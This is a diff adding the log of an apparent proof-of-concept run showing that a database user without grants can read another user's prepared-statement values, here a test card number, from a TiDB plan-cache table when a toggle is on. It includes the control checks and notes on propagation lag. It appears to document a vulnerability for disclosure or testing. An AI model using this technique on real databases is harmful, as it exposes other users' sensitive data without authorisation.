@@ -1,0 +1,31 @@
+########## TIDB-IS-PLANCODE-01 fresh E2E 2026-09-07T12:02:53Z
+--- setup: app user + payments.tokens ---
+--- step 1: negative control, toggle OFF -> attacker sees 0 rows ---
+rows_with_toggle_off
+0
+--- step 2: toggle ON, app user runs PREPARE/EXECUTE with card literal ---
+mysql: option '-e' requires an argument
+--- step 3: exploit - zerogrant reads plan cache ---
+--- baseline control: zerogrant cannot read payments.tokens ---
+--------------
+SELECT * FROM payments.tokens
+--------------
+
+ERROR 1142 (42000) at line 1: SELECT command denied to user 'zerogrant'@'%' for table 'tokens'
+--- step 2 (fixed): toggle ON, app user PREPARE/EXECUTE with card literal ---
+card_number	note
+4111-1111-1111-1111	visa-corp-pool
+toggle_now
+1
+--- step 3: exploit - zerogrant reads plan cache ---
+*************************** 1. row ***************************
+SQL_TEXT: SELECT card_number, note FROM payments.tokens WHERE card_number = ?
+PARSE_USER: app
+PARSE_VALUES: "4111-1111-1111-1111"
+--- re-check negative control still clean after exploit window ---
+rows_after_toggle_off
+1
+--- toggle-off propagation note (observed) ---
+Immediately after SET GLOBAL ...=OFF the table still returned 1 row for ~3-4 s
+(propagation lag), then 0 rows consistently. Negative control holds: steady-state
+toggle OFF -> attacker sees 0 rows.
